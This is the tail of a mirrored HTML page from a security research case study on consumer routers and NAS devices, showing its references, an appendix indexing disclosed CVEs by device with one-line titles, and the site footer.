+									distribution and processing workflows. The ability to intercept and modify firmware
+									could grant us the ability to remotely compromise our targets without any
+									authentication.</p>
+								<h3>References</h3>
+								<p>[1] “The Internet of Things: How to capture the value of IoT,” McKinsey &amp;
+									Company, May-2018. [Online]. Available:
+									https://www.mckinsey.com/~/media/McKinsey/Business Functions/McKinsey Digital/Our
+									Insights/The Internet of Things How to capture the value of
+									IoT/How-to-capture-the-value-of-IoT.ashx. [Accessed: 08-Apr-2019].</p>
+								<p>[2] https://www.ise.io/wp-content/uploads/2017/07/soho_techreport.pdf</p>
+								<p>[3] J. Holcomb, “Network Attached Shell: N.A.S.ty Systems That Store Network
+									Accessible Shells,” Jul-2014. [Online]. Available:
+									https://www.blackhat.com/docs/eu-14/materials/eu-14-Holcomb-Network-Attached-Shell-N-A-S-ty-Systems-That-Store-Network-Accessible-Shells.pdf.
+								</p>
+								<p>[4] “VPNFilter: New Router Malware with Destructive Capabilities,” 23-May-2018.
+									[Online]. Available:
+									https://www.symantec.com/blogs/threat-intelligence/vpnfilter-iot-malware. [Accessed:
+									08-Apr-2019].</p>
+								<p>[5] A. Marion, “Vulnerability Disclosure Policy,” Feb-2018. [Online]. Available:
+									https://vuls.cert.org/confluence/display/Wiki/Vulnerability Disclosure Policy.
+									[Accessed: 08-Apr-2019].</p>
+								<p>[6] “CWE-352: Cross-Site Request Forgery (CSRF).” [Online]. Available:
+									https://cwe.mitre.org/data/definitions/352.html. [Accessed: 08-Apr-2019].</p>
+								<p>[7] S. Barum and M. Gegick, “Reluctance to Trust,” Sep-2015. [Online]. Available:
+									https://www.us-cert.gov/bsi/articles/knowledge/principles/reluctance-to-trust.</p>
+								<p>[8] A. Mousa and A. Hamad, “Evaluation of the RC4 Algorithm for Data Encryption.”
+									[Online]. Available:
+									https://staff-old.najah.edu/sites/default/files/Evaluation_of_the_RC4_Algorithm_for_Data_Encryption.pdf.
+									[Accessed: 08-Apr-2019].</p>
+								<p>[9] C. Shannon, “Communication theory of secrecy systems,” Oct-1949. [Online].
+									Available: https://ieeexplore.ieee.org/document/6769090/metrics#metrics. [Accessed:
+									08-Apr-2019].</p>
+								<p>[10] H. Ballani, Y. Chawathe, S. Ratnasamy, T. Roscoe, and S. Shenker, “Off by
+									Default!,” Nov-2016. [Online]. Available:
+									https://www.microsoft.com/en-us/research/wp-content/uploads/2016/11/hotnets05-defoff.pdf.
+									[Accessed: 08-Apr-2019].</p>
+								<p>[11] Stanek, M. (2017). Secure by default – the case of TLS. [online] Arxiv.org.
+									Available at: https://arxiv.org/pdf/1708.07569.pdf [Accessed 15 May 2019].</p>
+								<p>[12] Jansen, B. (2018). Security By Default: A Comparative Security Evaluation of
+									Default Configurations. [online] Uvalight.net. Available at:
+									https://uvalight.net/~delaat/rp/2017-2018/p01/report.pdf [Accessed 15 May 2019].</p>
+								<p>[**11]“CVE Numbering Authorities.” [Online]. Available:
+									https://cve.mitre.org/cve/cna.html. [Accessed: 08-Apr-2019].</p>
+								<h3><strong>Appendix A: CVEs from SOHOpelessly Broken 2.0</strong></h3>
+								<p>Buffalo TeraStation TS5600D1206<br />
+									CVE-2018-13323 - Cross-site scripting via “username” cookie<br />
+									CVE-2018-13322 - Arbitrary Directory Listing via Path Traversal<br />
+									CVE-2018-13319 - Unauthenticated Information Disclosure<br />
+									CVE-2018-13324 - Authentication Bypass on JSONRPC API<br />
+									CVE-2018-13318 - Command Injection During User Creation (Second Order)<br />
+									CVE-2018-13320 - Command Injection in NT Domain Settings<br />
+									CVE-2018-13321 - Internal Functions Accessible via JSONRPC API</p>
+								<p>ASUS RT-AC3200<br />
+									CVE-2018-14710 - Reflected Cross-Site Scripting via appGet.cgi<br />
+									CVE-2018-14711 - Missing Cross-Site Request Forgery Protection on appGet.cgi<br />
+									CVE-2018-14714 - Command Injection via load_script Hook in appGet.cgi<br />
+									CVE-2018-14713 - Uncontrolled Format String via nvram_match Family in
+									appGet.cgi<br />
+									CVE-2018-14712 - Stack Buffer Overflow via delete_sharedfolder() in appGet.cgi</p>
+								<p>TerraMaster F2-420<br />
+									CVE-2018-13334 - Insufficient validation and sanitization in System name<br />
+									CVE-2018-13329 - Insufficient validation and sanitization in URL Parameters
+									(Reflected XSS)<br />
+									CVE-2018-13337 - Session Fixation<br />
+									CVE-2018-13338 - System Command Injection in User Creation (username)<br />
+									CVE-2018-13336 - System Command Injection in User Creation (password)<br />
+									CVE-2018-13332 - Arbitrary File Upload Location<br />
+									CVE-2018-13333 - Persistent Cross-site Scripting via username in File Manager
+									Permissions<br />
+									CVE-2018-13331 - Persistent Cross-site Scripting via username in Control Panel<br />
+									CVE-2018-13330 - System Command Execution in Group Creation<br />
+									CVE-2018-13335 - Persistent Cross-site Scripting via Shared Folder description in
+									Control Panel<br />
+									CVE-2018-13357 - Persistent Cross-site Scripting via Shared Folder name in Control
+									Panel<br />
+									CVE-2018-13352 - Session Tokens are stored as files in /tmp<br />
+									CVE-2018-13349 - Persistent Cross-site Scripting via username upon Login<br />
+									CVE-2018-13355 - Missing Authorization Check on Group Creation<br />
+									CVE-2018-13351 - Reflected Cross-site Scripting via Edit User Form<br />
+									CVE-2018-13356 - Missing Authorization on User Edit<br />
+									CVE-2018-13358 - System Command Injection in ajaxdata.php (checkName)<br />
+									CVE-2018-13353 - System Command Injection in ajaxdata.php (checkport)<br />
+									CVE-2018-13418 - System Command Injection in ajaxdata.php (User rename)<br />
+									CVE-2018-13354 - Unauthenticated System Command Injection in logtable.php<br />
+									CVE-2018-13350 - Unauthenticated SQL Injection in logtable.php<br />
+									CVE-2018-13361 - Unauthenticated User Enumeration<br />
+									CVE-2018-13359 - Unauthenticated Reflected Cross-Site Scripting<br />
+									CVE-2018-13360 - Reflected Cross-Site Scripting in Text Editor</p>
+								<p>Drobo 5N2<br />
+									CVE-2018-14699 - Unauthenticated Command Injection in username parameter in
+									enable_user<br />
+									CVE-2018-14697 - Reflected Cross-Site Scripting in enable_user<br />
+									CVE-2018-14698 - Reflected Cross-Site Scripting in delete_user<br />
+									CVE-2018-14701 - Unauthenticated Command Injection in username parameter in
+									delete_user<br />
+									CVE-2018-14703 - Unauthenticated Access to MySQL Database Password<br />
+									CVE-2018-14700 - Unauthenticated Access to MySQL Log Files<br />
+									CVE-2018-14695 - Unauthenticated Access to MySQL diag.php<br />
+									CVE-2018-14696 - Unauthenticated Access to device info via MySQL API drobo.php<br />
+									CVE-2018-14702 - Unauthenticated Access to device info via Drobo Pix API
+									drobo.php<br />
+									CVE-2018-14704 - Reflected Cross-Site Scripting via MySQL API droboapps.php<br />
+									CVE-2018-14705 - Lack of Authentication/Authorization on Administrative Web
+									Pages<br />
+									CVE-2018-14706 - Unauthenticated Command Injection in DroboPix<br />
+									CVE-2018-14707 - Unauthenticated Arbitrary File Upload in Drobo Pix<br />
+									CVE-2018-14709 - Insufficient Authentication in Client-Server Communications Between
+									Drobo Dashboard and NASd<br />
+									CVE-2018-14708 - Missing Transport Security in Client-Server Communications Between
+									Drobo Dashboard and NASd</p>
+								<p>Zyxel NSA325 v2<br />
+									CVE-2018-14892 - Missing Request Origin Verification Functionality (No CSRF
+									Protections)<br />
+									CVE-2018-14893 - Low-Privilege Root Command Injection via API</p>
+								<p>TOTOLINK A3002RU V1<br />
+									CVE-2018-13313 - Admin Password returned in password.htm<br />
+									CVE-2018-13312 - Cross-site Scripting in notice_gen.htm<br />
+									CVE-2018-13308 - Cross-site Scripting in notice_gen.htm<br />
+									CVE-2018-13309 - Cross-site Scripting in password.htm<br />
+									CVE-2018-13310 - Cross-site Scripting in password.htm<br />
+									CVE-2018-13315 - Missing Server-side Validation of Current Password During Password
+									Change<br />
+									CVE-2018-13311 - Command Injection via Samba Username<br />
+									CVE-2018-13306 - Command Injection via FTP Username<br />
+									CVE-2018-13307 - Command Injection via NTP Server IP Address<br />
+									CVE-2018-13314 - Command Injection in formAliasIP<br />
+									CVE-2018-13316 - Command Injection in formAliasIP<br />
+									CVE-2018-13317 - Cross-site scripting via URL Filter</p>
+								<p>Asustor AS-602T<br />
+									CVE-2018-12311 - Missing Input Sanitization on File Explorer filenames<br />
+									CVE-2018-12308 - Shared Folder Encryption Key sent as URL Parameter<br />
+									CVE-2018-12305 - Cross-site Scripting via SVG Images<br />
+									CVE-2018-12306 - Directory Traversal via download.cgi<br />
+									CVE-2018-12314 - Directory Traversal via downloadwallpaper.cgi<br />
+									CVE-2018-12309 - Directory Traversal via upload.cgi<br />
+									CVE-2018-12316 - Command injection via filenames<br />
+									CVE-2018-12313 - Unauthenticated access to SNMP configuration<br />
+									CVE-2018-12307 - Command Injection Through UserAdd<br />
+									CVE-2018-12312 - Command Injection Through Generate Two Step Auth<br />
+									CVE-2018-12310 - Cross-site Scripting on Login page<br />
+									CVE-2018-12319 - Login Denial of service<br />
+									CVE-2018-12315 - Password change does not require existing password<br />
+									CVE-2018-12318 - snmp.cgi Returns Password in Cleartext<br />
+									CVE-2018-12317 - Command Injection in group.cgi</p>
+								<p>Seagate STCR3000101<br />
+									CVE-2018-12298 - Lack of path canonicalization in filebrowser app<br />
+									CVE-2018-12295 - Failure to sanitize user input in SQL statements<br />
+									CVE-2018-12299 - Insufficient validation and sanitization on user supplied file
+									names<br />
+									CVE-2018-12303 - Insufficient validation and sanitization on user supplied directory
+									names<br />
+									CVE-2018-12297 - Insufficient validation and sanitization on API endpoints<br />
+									CVE-2018-12300 - Arbitrary Redirect<br />
+									CVE-2018-12302 - Missing Cookie Hardening Flags<br />
+									CVE-2018-12296 - Server Information Disclosure<br />
+									CVE-2018-12304 - Missing Output Sanitization in App Manager<br />
+									CVE-2018-12301 - Download Manager Allows Using localhost and 127.0.0.1</p>
+								<p>QNAP TS-870<br />
+									CVE-2018-19941 - Username and Password Stored as Cookies During Login Redirect<br />
+									CVE-2018-19942 - Insecure “Open” Functionality in Filemanager<br />
+									CVE-2018-19943 - Missing Input Sanitization on File names<br />
+									CVE-2018-19944 - SNMP Passwords Returned in Plaintext<br />
+									CVE-2018-19945 - Arbitrary Path File Upload<br />
+									CVE-2018-19946 - Missing Certificate Validation When Issuing cURL Requests<br />
+									CVE-2018-19947 - Verbose Error Messages (File Upload PHP File Path Disclosure)<br />
+									CVE-2018-19948 - CSRF File Upload (Helpdesk)<br />
+									CVE-2018-19949 - Command Injection In Username On Proper Authentication After
+									Account Creation<br />
+									CVE-2018-19950 - Command Injection In UserName In Music Station In File Upload
+									Functionality When Uploading Content to Private Collection<br />
+									CVE-2018-19951 - Stored XSS In File Name In Music Station<br />
+									CVE-2018-19952 - SQLi in Mediatool API for Shared Playlist Link Log Viewing<br />
+									CVE-2018-19953 - Missing Output Sanitization on FileStation Shared Link
+									Creator<br />
+									CVE-2018-19954 - Persistent Cross-Site Scripting in PhotoStation Filenames<br />
+									CVE-2018-19955 - Reflected Cross-Site Scripting in PhotoStation Filenames<br />
+									CVE-2018-19956 - Reflected Cross-Site Scripting in PhotoStation via URL
+									Parameters<br />
+									CVE-2018-19957 - Missing Hardening Headers</p>
+								<p>Mi Router<br />
+									CVE-2018-16130 - Insufficient Shell Input Validation in request_mitv
+									Functionality<br />
+									CVE-2018-13023 - Insufficient Shell Input Validation in wifi_access
+									Functionality<br />
+									CVE-2018-13022 - Reflected Sniffed Cross-Site Scripting via API 404</p>
+								<p>Lenovo ix4-300d<br />
+									CVE-2018-9074 - Arbitrary File Path Selection When Uploading Files<br />
+									CVE-2018-9075 - System Command Injection in client:password parameter in
+									PersonalCloudJoin<br />
+									CVE-2018-9076 - System Command Injection in name parameter in ShareModify<br />
+									CVE-2018-9077 - System Command Injection in share:name parameter in
+									ShareModify<br />
+									CVE-2018-9078 - Insufficient validation and sanitization when hosting SVG
+									images<br />
+									CVE-2018-9079 - Insufficient validation and sanitization in cat URL parameter<br />
+									CVE-2018-9080 - Session Fixation via iomega Cookie<br />
+									CVE-2018-9081 - Insufficient validation and sanitization in file parameter<br />
+									CVE-2018-9082 - Password change does not require existing password</p>
+								<p>Synology DS218j<br />
+									CVE-2018-13282 - Session Fixation in Photo Station Application<br />
+									CVE-2018-13281 - Determine Existence and Metadata of Arbitrary Files</p>
+								<p>Netgear Nighthawk X10-R9000<br />
+									CVE-2019-12510 - Authentication bypass via X-Forwarded-For header<br />
+									CVE-2019-12511 - System command injection via SOAP API<br />
+									CVE-2019-12512 - Cross-site scripting via X-Forwarded-For header<br />
+									CVE-2019-12513 - Cross-site scripting in logs via malicious DHCP request</p>
+								<p class="text-center"><a href="../../wp-content/uploads/2019/09/SOHO2.pdf"
+										target="_blank" rel="noopener">Download PDF Report</a></p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<footer class="entry-footer"></footer>
+</article>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+    <!-- SHAPE
+    ================================================== -->
+    <div class="position-relative">
+    <div class="shape shape-bottom shape-fluid-x svg-shim text-gray-200">
+        <svg viewBox="0 0 2880 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 48h2880V0h-720C1442.5 52 720 0 720 0H0v48z" fill="currentColor"/></svg>
+    </div>
+    </div>
+
+    <!-- FOOTER
+    ================================================== -->
+    <footer class="py-8 py-md-11 bg-gray-200">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-md-2">
+
+            <!-- Brand -->
+            <img src="../../assets/img/brand-text.svg" alt="..." class="footer-brand img-fluid mb-2">
+
+
+            <!-- Social -->
+            <ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://www.linkedin.com/company/independent-security-evaluators" class="text-decoration-none" rel="noopener">
+                  <img src="../../assets/img/icons/social/linkedin.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://facebook.com/ISE.infosec" class="text-decoration-none" rel="noopener">
+                  <img src="../../assets/img/icons/social/facebook.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://twitter.com/ISEsecurity" class="text-decoration-none" rel="noopener">
+                  <img src="../../assets/img/icons/social/twitter.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+            </ul>
+
+            <div class="py-4">
+
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../contact/index.html">Contact Us</a>
+              </h6>
+  
+            </div>
+  
+            <div>
+  
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../privacy-policy/index.html">Privacy Policy</a>
+              </h6>
+  
+            </div>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              About
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../about/values/index.html" class="text-reset">
+                  Company Values
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../about/methodology/index.html" class="text-reset">
+                  Methodology
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../about/leadership/index.html" class="text-reset">
+                  Leadership
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../news/index.html" class="text-reset">
+                  News
+                </a>
+              </li>
+              <li>
+                <a href="../../careers/index.html" class="text-reset">
+                  Careers
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Services
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../services/vulnerability-assessments/index.html" class="text-reset">
+                  Assessments
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../services/security-consulting-services/index.html" class="text-reset">
+                  Consulting
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="https://www.iotvillage.org/" target="_blank" class="text-reset" rel="noopener">
+                  IoT Village <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li">
+                <a href="../../services/training/index.html" class="text-reset" rel="noopener">
+                  Training
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Research
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-0">
+              <li class="mb-3">
+                <a href="../../research/index.html" class="text-reset">
+                  Studies & Papers
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../talks/index.html" class="text-reset">
+                  Talks
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../blog/index.html" class="text-reset" rel="noopener">
+                  Blog <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../start/blog/index.html" class="text-reset" rel="noopener">
+                  VRM/TPRM Articles
+                </a>
+
+            </ul>
+
+          </div>
+
+          <div class="col-12 col-md-4">
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Stay up to date on the latest research and industry trends. Sign up for our newsletter
+            </h6>
+            <!-- Heading -->
+            <!--[if lte IE 8]>
+            <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
+            <![endif]-->
+            <script charset="utf-8" type="text/javascript" src="../../../js.hsforms.net/forms/v2.js"></script>
+            <script>
+            hbspt.forms.create({
+            region: "na1",
+            portalId: "7197110",
+            formId: "e868052f-9574-4c5b-a8e0-6233b8b6b6d2"
+            });
+            </script>
+
+          </div>
+
+        </div> <!-- / .row -->
+      </div> <!-- / .container -->
+    </footer>
+
+    <!-- JAVASCRIPT
+    ================================================== -->
+    <!-- Libs JS -->
+    <script src="../../assets/libs/jquery/dist/jquery.min.js"></script>
+    <script src="../../assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.js"></script>
+    <script src="../../assets/libs/aos/dist/aos.js"></script>
+
+    <!-- <script src="../../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script> -->
+    <!-- <script src="../../assets/libs/countup.js/dist/countUp.min.js"></script> -->
+    <!-- <script src="../../assets/libs/dropzone/dist/min/dropzone.min.js"></script> -->
+    <!-- <script src="../../assets/libs/flickity/dist/flickity.pkgd.min.js"></script>
+    <script src="../../assets/libs/flickity-fade/flickity-fade.js"></script>
+    <script src="../../assets/libs/highlightjs/highlight.pack.min.js"></script> -->
+    <script src="../../assets/libs/imagesloaded/imagesloaded.pkgd.min.js"></script>
+    <!-- <script src="../../assets/libs/isotope-layout/dist/isotope.pkgd.min.js"></script> -->
+    <!-- <script src="../../assets/libs/jarallax/dist/jarallax.min.js"></script> -->
+    <!-- <script src="../../assets/libs/jarallax/dist/jarallax-video.min.js"></script> -->
+    <!-- <script src="../../assets/libs/jarallax/dist/jarallax-element.min.js"></script> -->
+    <!-- <script src="../../assets/libs/quill/dist/quill.min.js"></script> -->
+    <!-- <script src="../../assets/libs/smooth-scroll/dist/smooth-scroll.min.js"></script> -->
+     <script src="../../assets/libs/typed.js/lib/typed.min.js"></script>
+
+    <!-- Map -->
+    <!-- <script src='https://api.mapbox.com/mapbox-gl-js/v0.53.0/mapbox-gl.js'></script> -->
+
+    <!-- Theme JS -->
+    <script src="../../assets/js/theme.min.js"></script>
+
+
+</body>
+
+
+<!-- Mirrored from www.ise.io/casestudies/sohopelessly-broken-2-0/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:27:54 GMT -->
+</html>
